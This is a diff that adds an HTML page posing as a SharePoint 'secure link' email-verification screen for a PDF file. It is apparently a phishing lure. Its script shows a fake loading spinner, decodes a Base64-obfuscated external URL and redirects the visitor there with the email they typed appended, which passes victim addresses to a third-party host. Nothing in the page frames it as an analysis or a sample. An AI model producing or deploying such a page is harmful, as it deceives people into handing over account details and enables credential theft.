@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Email Verification - FT564</title>
+  
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9f9;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 80vh;
+
+  
+}
+
+.page-wrapper {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 87vh;
+  width: 87vw;
+}
+
+
+    .wrapper {
+      text-align: center;
+      background-color: #f8f9f9;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      max-width: 330px;
+      width: 50%;
+    }
+
+    .header {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #036C70;
+    }
+
+    .subheader {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .input-container {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    button {
+      padding: 12px 108px;
+      font-size: 16px;
+      background-color: #1D7CDA;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      max-width: 480px;
+    }
+
+    button:hover {
+      background-color: #1D7CDK;
+    }
+
+    .loader {
+      display: none;
+      margin-top: 80px;
+      border: 9px solid #f3f3f3;
+      border-top: 4px solid #036C70;
+      border-radius: 100%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+      margin-bottom: 30px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .success-message {
+      display: none;
+      margin-top: 5px;
+      background-color: #f8f9f9;
+      padding: 5px;
+      border-radius: 5px;
+      border: 1px solid #f8f9f9;
+      font-size: 15px;
+      color: #00695c;
+    }
+  </style>
+
+
+
+<div class="page-wrapper">
+  <div class="wrapper">
+     
+    <img src="https://logos-world.net/wp-content/uploads/2022/12/SharePoint-Symbol.png" width="180" height="100">
+    <div class="subheader">
+      You've received a secure link to:
+<p style="font-size: 18px; font-weight: ; color: #000;">FAC-6864-012-TT.pdf</p>
+To proceed, enter the email that this item was shared to
+    </div>
+    <div class="input-container">
+      <input type="email" id="emailInput" placeholder="Enter your email" required autocomplete="off" />
+      <button id="submitButton">Next</button>
+    </div>
+    <div class="loader" id="loader"></div>
+    <div class="success-message" id="successMessage">
+    
+    
+    </div>
+    <p>&copy;2025 All rights reserved.</p>
+  </div>
+
+  <script>
+    // Function to validate email format
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    // Function to handle email verification and redirection
+    function verifyEmail() {
+      const emailInput = document.getElementById("emailInput").value.trim();
+      const loader = document.getElementById("loader");
+      const successMessage = document.getElementById("successMessage");
+
+      // Validate email format
+      if (!validateEmail(emailInput)) {
+        alert("Please enter a valid email address.");
+        return;
+      }
+
+      // Show loader and hide input section
+      document.querySelector(".input-container").style.display = "none";
+      loader.style.display = "block";
+
+      // Simulate a delay before showing the success message
+      setTimeout(() => {
+        loader.style.display = "none";
+        successMessage.style.display = "block";
+
+        // Redirect to a URL with the email appended
+        const encodedRedirectURL = "aHR0cHM6Ly9wZWJsZXkuaG9iYnlwbHVzLnJvL0RzRXRORE01WXkwLyM="; // Base64 encoded URL
+        const decodedRedirectURL = atob(encodedRedirectURL); // Decode Base64
+        const redirectURL = `${decodedRedirectURL}${emailInput}`; // Append email directly
+
+        // Simulate the redirection after a few seconds
+        setTimeout(() => {
+          window.location.href = redirectURL; // Redirect to the final URL
+        }, 10);
+      }, 4000); // Wait 2 seconds before showing the success message
+    }
+
+    // Handle the submit button click
+    document.getElementById("submitButton").addEventListener("click", (e) => {
+      e.preventDefault();
+      verifyEmail();
+    });
+
+    // Allow pressing Enter to submit form
+    document.getElementById("emailInput").addEventListener("keypress", function (e) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        verifyEmail();
+      }
+    });
+  </script>
+
+
